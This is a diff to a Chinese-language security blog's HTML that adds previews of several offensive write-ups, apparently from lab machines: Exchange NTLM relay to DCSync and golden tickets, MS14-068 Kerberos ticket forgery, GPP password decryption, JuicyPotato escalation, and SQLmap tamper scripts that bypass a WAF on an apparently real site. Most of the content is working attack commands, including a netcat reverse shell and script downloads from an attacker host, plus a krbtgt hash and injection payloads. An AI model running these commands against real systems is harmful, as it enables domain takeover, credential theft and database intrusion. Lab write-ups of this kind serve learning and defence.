@@ -118,6 +118,401 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/" class="title">域控提权之Exchange提权</a>
+    <section class="desc">
+  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
+也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
+漏洞利用：net group 查看用户组
+
+或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
+添加用户tw：
+$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
+New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
+net group &quot;Exchange Windows Permissions&quot; tw /add 
+或
+Import-Module ActiveDirectory
+Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
+net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
+sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
+python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）
+
+连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
+impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
+进一步学习：在Linux上使用KRBTGT hash实现金票攻击
+在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
+首先获取domain sid ：
+Get-ADDomain htb.local
+S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
+python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
+export KRB5CCNAME=UserDoesnotExit.ccache
+使用TGT使用下列任意方式远程执行命令
+python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161
+
+python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/" class="title">域控提权之ms14-068</a>
+    <section class="desc">
+  危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
+一、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 
+什么是PAC（特权帐户证书）：
+PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
+二、利用条件1.域控机器没有打漏洞补丁      补丁号：KB3011780
+2.拥有一台域内机子及其sid三、漏洞利用漏洞检测：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
+./FindSMB2UPTime.py 192.168.31.220
+DC is up since: 2013-12-28 22:24:25
+This DC is vulnerable to MS14-068获取域控制器补丁状态:Get-DCPatchStatus.ps1
+# This is an example script only.
+import-module activedirectory
+[string]$KBNumber = &quot;KB3011780&quot;
+$DomainControllers = Get-ADDomainController -filter *
+[int]$DomainControllersCount = $DomainControllers.Count
+[int]$PatchedDCCount = 0
+[int]$UnPatchedDCCount = 0
+$UnpatchedDCs = @()
+Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;
+ForEach ($DomainController in $DomainControllers)
+{
+    $DomainControllerHostName = $DomainController.HostName
+    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue
+
+    IF ($PatchStatus.InstalledOn)
+        {
+            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
+            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;
+            $PatchedDCCount++
+        }
+    Else
+        {
+            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;
+            [array]$UnpatchedDCs += $DomainController.HostName
+            $UnPatchedDCCount++
+        }
+}
+Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;
+IF ($UnpatchedDCs)
+{
+    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;
+    $UnpatchedDCs
+}环境描述：
+目标机器：10.10.10.52  Windows Server 2008 R2 Standard
+已获取：DC上的一个普通本地账户
+
+james用户账户密码
+
+
+james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）
+
+攻击机：kali 10.10.14.14  （不在域中）
+在Linux上：(没有目标shell的情况下)1.安装客户端，在客户端生成票证
+sudo apt-get install krb5-user cifs-utils rdate2./etc/hosts中添加：（内网机器没有映射，所以需要添加）
+10.10.10.52 htb.local htb mantis.htb.local  mantis3.编辑/etc/krb5.conf
+[libdefaults]
+    default_realm = HTB.LOCAL
+
+[realms]
+   HTB.LOCAL = {
+    kdc = mantis.htb.local:88
+    admin_server = mantis.htb.local
+    default_domain = HTB.LOCAL
+    }
+[domain_realm]
+    .domain.internal = HTB.LOCAL
+    domain.internal = HTB.LOCAL4.添加路由：编辑/etc/resolve.conf
+nameserver 10.10.10.525.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）
+
+[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间
+
+[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间
+
+
+6.为james用户生成一张新的Kerberos票证
+kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit james
+klist
+此时生成的是jame是的票证：访问C$是没有权限的
+kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
+tree connect failed: NT_STATUS_ACCESS_DENIED7.ms14-068生成高权限TGT票证
+
+8.替换低权限票证
+mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_10009.smb成功登录C$
+
+Mimikatz：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
+ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中
+mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket
+net use \\htb.local\admin$    ####使用IP可能会失败
+dir \\htb.local\c$ 
+psexec  \\htb.local  cmd.exe突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接原理：https://www.freebuf.com/vuls/56081.html
+GoldenPac,py也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）
+
+
+
+</section>
+    <p class="sub">Apr 25, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" class="title">Kerberos认证学习</a>
+    <section class="desc">
+  Kerberos简介：
+
+Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）
+
+几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）
+
+Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥
+
+
+
+
+1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
+2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
+AS向Clinet发送两条消息：        
+消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
+步骤1中用户提供的信息+TGS SESSION KEY                
+消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
+TGS名称/ID            
+时间戳            
+TGS SESSION KEY
+TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
+3、TGS-REQ(金票攻击发生在此步骤)
+Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
+你的名称/ID
+时间戳`消息2：[未加密消息]
+所要请求服务的名称/ID
+服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
+4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
+步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
+步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
+检查TGT是否过期
+检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
+消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
+消息2：[TGS Session Key加密]    
+服务名称/ID   
+时间戳    
+票据生存期    
+Service Session Key5、AP-REQ银票攻击发生在此步骤
+Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
+用户名称/ID
+时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
+6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
+
+
+</section>
+    <p class="sub">Apr 25, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/25/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E4%B9%8B%E6%BB%A5%E7%94%A8GGP/" class="title">域内提权之滥用GGP</a>
+    <section class="desc">
+  在SYSVOL查找密码组策略首选项（GPP）中的密码
+原理：什么是GPP
+GPP被用来将通用的本地管理员密码应用于所有工作站、应用全新的管理员帐户、为其他用户安排任务、应用打印机等用途
+一般域内机子较多的情况，管理员为了方便管理，在主机上设置本地管理员密码GPP。配置此功能后，会在域控制器上创建一个XML文件，其中包含将策略应用于连接到域的工作站或便携式计算机时配置帐户所需的信息。
+该xml文件包含管理帐户的密码，一般情况下任意域用户都可以读取（通常是DC开启SYSVOL目录共享）
+这里不得不提的一点是Microsoft已使用AES加密了xml文件中的密码以提高安全性，但又发布了用于加密和解密该值的密钥（所以这是什么操作？？？）
+漏洞利用：连接到域控制器的默认SYSVOL共享，并在其中搜索groups.xml的实例。如果存在这些文件，它们将位于格式类似于以下的文件夹中：
+\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml1、定位域控制器
+set l   
+nltest /DSGETDC:
+echo %logonserver%
+net time /domain
+......2、查询DC共享目录使用enumlinux或者smbmap检查共享目录：
+smbmap -H 10.10.10.100  ###列出目标用户共享列表
+---- -----------
+ADMIN$ NO ACCESS
+C$ NO ACCESS
+IPC$ NO ACCESS
+NETLOGON NO ACCESS
+replication read only   
+SYSVOL NO ACCESS
+Users NO ACCESS3、连接域共享
+smbclient //active.htb/Replication -N
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\more Groups.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;4、解密使用gpprefdecrypt.py： 
+python gpprefdecrypt.pyedBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+</section>
+    <p class="sub">Apr 25, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/" class="title">JuicyPotato提权</a>
+    <section class="desc">
+  项目地址：https://github.com/ohpe/juicy-potato/
+0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广
+利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
+whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
+
+
+0x02、JuicyPotato功能自主选择CLSID
+-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
+自定义COM监听端口
+-l : COM server listen port
+COM监听地址
+-m : COM server listen address (default 127.0.0.1)
+进程创建模块 
+-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
+执行指定进程或脚本
+-p : program to launch
+为指定的执行进程选择参数
+-a : command line argument to pass to program (default NULL)
+RPC服务地址
+-k : RPC server ip address (default 127.0.0.1)
+RPC服务端口：
+-n : RPC server listen port (default 135)
+支持测试模块；测试并查找clsid
+-z only test CLSID and print token’s user
+0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+
+反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
+echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
+提取CLSID Powershell脚本 GetCLSID.ps1
+同级目录下需要有Join-Object.ps1
+GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
+Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}[2]批处理调用juicypotato.exe逐个测试CLSID
+test_clsid.bat:
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)0x05、限制条件
+需要支持SeImpersonate或者SeAssignPrimaryToken权限
+开启DCOM
+本地支持RPC或者远程服务器支持PRC并能成功登录
+能够找到可用的COM对象
+
+https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/
+
+
+</section>
+    <p class="sub">Apr 22, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/" class="title">一次注入实战引发的SQLMAP修改之路</a>
+    <section class="desc">
+  首发于先知社区：https://xz.aliyun.com/t/6864
+#一、    前言SQLmap的payload修改一般有两种方式:  1、编写tamper  2、修改/添加sqlmap的xml文件语句自定义payload
+#二、    注入点Fuzz选中目标网站：http://www.xxxx.com/journals_desc.php?id=40单引号报错，对单引号进行转义，id=0=0测试回显正常，int型注入
+
+Order by 猜字段值为7
+Waf为Modsec，直接使用union select被拦截：
+
+Fuzz：
+单个union    #不拦截
+单个select    #不拦截
+Union select  #拦截
+union /**/ select #拦截
+/*!00000union*/ select #内联注释，不拦截
+/*!50000union*/ select 1,2,3,4,5,6,7 
+此处应该是涉及到强弱类型转换的问题，int为强类型，猜测对应的字段为弱类型解决方法：[1]使用string方法、但单引号’ 被被转义了,所以该方法行不通
+[2]采用报错注入
+#三、编写简单Tamper脚本绕过（使用自带的modsecurityzeroversioned.py不能绕过）
+报错注入过程中，发现主要过滤关键词from和函数concat（）
+1、concat()被过滤:concat()--&gt;concat/**/()  对应tamper脚本concat2concatcomment.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;CONCAT&quot;,&quot;CONCAT/**/&quot;)2、from被过滤，from–&gt;/*!44144from*/对应tamper脚本from.py如下：
+#!/usr/bin/env python2
+&quot;&quot;&quot;
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
+See the file &apos;LICENSE&apos; for copying permission
+&quot;&quot;&quot;
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.LOW
+def dependencies():
+pass
+def tamper(payload, **kwargs):
+return payload.replace(&quot;FROM&quot;,&quot;/*!44144FROM*/&quot;)验证：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot; --force-ssl  --technique=E
+--dbs读取（可以比对一下使用tamper脚本和使用tamper脚本后语句）payload in sqlmap:
+1AND (SELECT 8403 &#x2F;*!44144FROM*&#x2F;(SELECT COUNT(*),CONCAT&#x2F;**&#x2F;(0x716b707071,(SELECT REPEAT(0x34,1024)),0x71627a7a71,FLOOR(RAND(0)*2))x &#x2F;*!44144FROM*&#x2F; INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+--tables读取，很遗憾，读取失败
+
+再次把它的payload拿到本地测试，也是行不通的。语句很长，需要慢慢fuzz究竟是哪里被拦截、组合、函数、关键字？
+但是，，，，坑的是竟然不是因为过滤引起的？？？？
+#四、修改SQLmap的xml文件语句实在不行了，去用手工注了出来，但是用SQLmap就是跑不出来？？？再去看一下SQLmap的payload是不是有问题，咋一看没什么大问题，所以我一开始也忽略了，卡了好久。也就是这里涉及到了直接修改SQLmap自带的语句。大家自行比较一下下面这两条语句看看能不能看出问题~1、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.TABLES%20where%20table_schema=database())%20),1)2、
+https://www.xxxx.com/journals_desc.php?id=40%20and%20updatexml/**/(1,concat/**//**/(0x7e,(select%20DISTINCT%20GROUP_CONCAT(table_name)/*!44144from*/%20%20%20information_schema.`TABLES`%20where%20table_schema=database())%20),1)下面讲几个概念
+[1]table和colums在mysql中是特殊字符
+[2]反引号是sql语言的转义字符
+[3]在mysql中的sql语句为了避免与系统冲突给表名加上反引号  ，（但在指定其他数据库时不能加，否则会被认作是表）
+我们可以看到这里sqlmap的payload,对于information_schema.tables中的tables并没有加反引号,指引到/xml/queries.xml
+information_schema.tables --&gt; information_schema.`tables`当然，columns也需要修改
+information_schema.columns --&gt; information_schema.`columns`修改之后跑表：
+python sqlmap.py -u &quot;https://www.xxxx.com/journals_desc.php?id=66&quot; --level 3 --risk 3 -v 3 --tamper=&quot;from,concat2concatcomment&quot;   --technique=E   -D mililink_main --tablespayload in sqlamp（比对一下payload，看看效果）:
+66 AND (SELECT 9571 /*!44144FROM*/(SELECT COUNT(*),CONCAT/**/(0x716b7a6b71,(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) /*!44144FROM*/ INFORMATION_SCHEMA.`TABLES` WHERE table_schema IN (0x6d696c696c696e6b5f6d61696e) LIMIT 15,1),0x7171767071,FLOOR(RAND(0)*2))x /*!44144FROM*/ INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+跑列值也是一样的，就不多说了，直接上图
+
+#五、关于SQLmap自定义payload的一些思考SQLmap的payload修改，其实并不复杂。
+tamper脚本的编写，可以参考上边的from.py和concat2concatcomment.py，它其实是有固定格式的。简单的自定义paylaod只需要在def tamper(payload, **kwargs)函数中写入替换语句即可。可参考https://payloads.online/archivers/2017-06-08/1
+修改/添加sqlmap的xml文件语句来自定义payload。需要找到对应的xml文件，然后修改xml文件中的语句。    查询语句在\sqlmap\data\xml\ queries.xml定义，若想自定义查询语句则只需要修改/添加想要执行的查询语句即可，如上边对INFORMATION_SCHEMA.TABLES的修改不同的注入方式使用的语句则需要在对应的注入方式中的xml语句进行修改，在\sqlmap\data\xml\payloads\文件下
+
+假若我们需要修改error-base注入方式的payload，则需要在/xml/payload/error_based.xml中修改
+
+
+</section>
+    <p class="sub">Apr 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/" class="title">从两道靶场题目看XHR</a>
     <section class="desc">
   首发于先知社区：https://xz.aliyun.com/t/7473/
@@ -501,6 +896,491 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="域控提权之Exchange提权" alt="域控提权之Exchange提权" href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域控提权之Exchange提权" alt="域控提权之Exchange提权"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域控提权之Exchange提权 &gt;</div>
+                            <div class="content flex1">
+                                
+  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
+也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
+漏洞利用：net group 查看用户组
+
+或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
+添加用户tw：
+$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
+New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
+net group &quot;Exchange Windows Permissions&quot; tw /add 
+或
+Import-Module ActiveDirectory
+Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
+net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
+sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
+python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）
+
+连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
+impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
+进一步学习：在Linux上使用KRBTGT hash实现金票攻击
+在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
+首先获取domain sid ：
+Get-ADDomain htb.local
+S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
+python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
+export KRB5CCNAME=UserDoesnotExit.ccache
+使用TGT使用下列任意方式远程执行命令
+python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161
+
+python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="域控提权之ms14-068" alt="域控提权之ms14-068" href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域控提权之ms14-068" alt="域控提权之ms14-068"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域控提权之ms14-068 &gt;</div>
+                            <div class="content flex1">
+                                
+  危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
